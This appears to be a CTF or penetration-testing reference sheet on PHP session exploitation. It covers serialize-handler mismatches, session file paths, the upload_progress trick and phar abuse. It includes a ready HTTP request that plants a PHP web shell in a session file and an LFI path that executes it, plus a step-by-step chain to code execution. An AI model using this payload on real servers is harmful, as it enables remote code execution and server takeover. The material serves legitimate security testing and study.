# PHP Session Tricks — the handler, the file, the upload_progress oracle

## The three session serializers

`session.serialize_handler` picks the grammar PHP uses to write/read
`$_SESSION`:

| Handler | Format | Marker |
|---|---|---|
| `php_serialize` (default ≥5.5.4) | `a:N:{...}` — the SAME grammar as `serialize()` | `a:1:{s:4:"name";s:5:"admin";}` |
| `php` (the old default) | `name|a:N:{...}` — `|` splits key from serialized value | `name|a:1:{...}` |
| `php_binary` | `len name + serialized value` — binary-framed | rare |

The `php` handler's `|` is the interesting one — a session file written by
one handler can be read by another if `session.serialize_handler` differs
between write and read paths.

## The session-file path — `sess_<PHPSESSID>`

```
/var/lib/php/sessions/sess_<PHPSESSID>
/tmp/sess_<PHPSESSID>
/var/lib/php/session/sess_<PHPSESSID>
```

The file's contents are `serialize_handler`-formatted — a value written
into `$_SESSION` lands there as serialized bytes. If an endpoint lets you
set `PHPSESSID` AND lets you write a value into `$_SESSION`, you control a
file's name AND part of its contents → LFI/RFI escalation.

## `session.upload_progress` — the upload-progress oracle

```php
// PHP ≥5.4 with session.upload_progress.enabled=On (default):
// POSTing a file with a field named PHP_SESSION_UPLOAD_PROGRESS
// writes $_SESSION['upload_progress_<key>'] into the session file
```

The file-upload POST that *also* sets `PHP_SESSION_UPLOAD_PROGRESS` causes
PHP to write the progress data (including YOUR filename) into
`sess_<PHPSESSID>` — attacker-controlled bytes inside a predictable-path
file, readable via LFI. The filename field is the injected content.

```http
POST /any-page HTTP/1.1
Content-Type: multipart/form-data; boundary=----
Cookie: PHPSESSID=pwn

------
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

X|O:8:"User":1:{s:4:"rce";s:29:"<?php system($_GET['c']);?>";}
------
Content-Disposition: form-data; name="file"; filename="x"; Content-Type: a

----
```

then `?file=/var/lib/php/sessions/sess_pwn` via LFI → the session file's
serialized bytes are parsed as code.

## The `session_start` + cookie-fixation chain

```
1. you control PHPSESSID          → the session file name is yours
2. a writeable $_SESSION key       → part of the contents is yours
3. session.serialize_handler=php   → the `|` separator can split your
                                     injected key from its value → you
                                     write a *key|value* pair
4. LFI reads sess_<id>             → code exec
```

## The stored-serialize in session — second-order

```php
// write:  $_SESSION['prefs'] = serialize($obj);   (serialized at write)
// read:   $u = unserialize($_SESSION['prefs']);   (deserialized at read)
```

If the write path stores attacker-supplied serialized text and the read
path unserializes it — the session is the second-order store (see
`second-order.md`). Even simpler: some apps `unserialize` a `$_SESSION`
value they assume they wrote — your `$_SESSION` write via a different
endpoint poisons it.

## The `phar` via session-file trick

A session file whose contents are a valid phar stub + your serialized
metadata — `phar://sess_<id>/x` triggers it. The session file IS the phar.
Rare but real on default session paths.

## The `register`/`pollute` pre-`session_start` trick

Some apps `session_start()` *after* `$_SESSION['x'] = input` — the write
lands in the global `_SESSION` superglobal even before `session_start`
formalizes it. An attacker-set key that the app later `unserialize`s is a
second-order primitive via the writeable session.

## The PHP `session.serialize_handler` mismatch

If the write path uses `php_serialize` (`a:N:{...}`) and a *different*
endpoint reads the session file via `php` handler (`name|a:N:{...}`), the
`|` lets your injected key-name be interpreted as the *key* and the rest as
the value — an injection at the handler boundary. Same bytes, two grammars.

## Detection — the signal the session is a sink

- a `PHPSESSID` cookie is set + the app writes to `$_SESSION`
- `session.upload_progress.enabled` — any file upload to ANY endpoint
- a `sess_*` file readable via LFI
- the read path shows `unserialize($_SESSION[...])` in source

## Falsifiers

- `session.serialize_handler=php_serialize` + no `|` separator injection +
  no control of the session contents → no grammar gap
- session is stored server-side (DB/redis) and never file-read + no
  `unserialize` on the read path → inert store
- `session.upload_progress` disabled AND no `PHPSESSID` write control

## Output to record

- The handler (`php`/`php_serialize`/`php_binary`) if it matters
- The session write path + the read/trigger path
- Whether LFI was the read primitive, and the flag evidence
